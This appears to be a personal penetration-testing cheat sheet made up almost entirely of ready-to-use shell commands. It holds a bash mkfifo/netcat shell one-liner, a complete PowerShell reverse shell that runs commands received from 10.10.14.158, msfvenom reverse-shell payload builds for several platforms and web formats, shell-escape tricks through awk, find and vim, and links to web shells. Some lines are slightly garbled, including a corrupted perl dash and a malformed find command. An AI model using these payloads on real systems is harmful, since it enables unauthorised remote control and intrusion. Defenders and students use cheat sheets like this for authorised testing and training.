Navigation: [[Pentesting]]

---
**Netcat**
```shell
# Listener
sudo nc -lvnp <port>

# Connect to listener
nc -nv <ip><port>
```

**One Liners**
```shell
# Bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

# Powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**MSFVenom**
```shell
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > nameoffile.elf

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > nameoffile.exe

# Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho > nameoffile.macho

# Asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > nameoffile.asp

# Jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > nameoffile.jsp

# Java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > nameoffile.war
```

**Interactive Shells by Language**
```shell
# Python
python -c 'import pty; pty.spawn("/bin/sh")'

# Bash
/bin/sh -i
awk 'BEGIN {system("/bin/sh")}'
find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'

# perl
perl â€”e 'exec "/bin/sh";'

# ruby
ruby: exec "/bin/sh"

# Lua
Lua: os.execute('/bin/sh')

```

**Further Reading**
[`Laudanum Web Shell`](https://github.com/jbarcia/Web-Shells/blob/master/laudanum/asp/shell.asp)
[`Antak Web Shell`](https://github.com/samratashok/nishang/blob/master/Antak-WebShell/antak.aspx)


---
Navigation: [[Pentesting]]